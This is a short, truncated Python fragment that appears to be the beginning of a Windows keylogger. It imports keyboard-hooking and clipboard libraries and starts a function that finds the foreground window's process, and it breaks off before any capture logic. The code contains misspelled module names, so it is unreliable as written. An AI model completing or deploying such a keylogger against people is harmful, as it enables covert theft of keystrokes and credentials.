from cytes import *
import pythoncom
import pyHook
import win32clipboard

user32         = windll.user32
kernal32       = windll.kernal32
psapi          = windll.psapi
current_window = None


def get_current_process():
    # get a handle to the foreground window
    #1
    hwnd = user32.GetForegroundWindow()

    # find the process ID
    pid = c_ulong(0)
    #2
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    
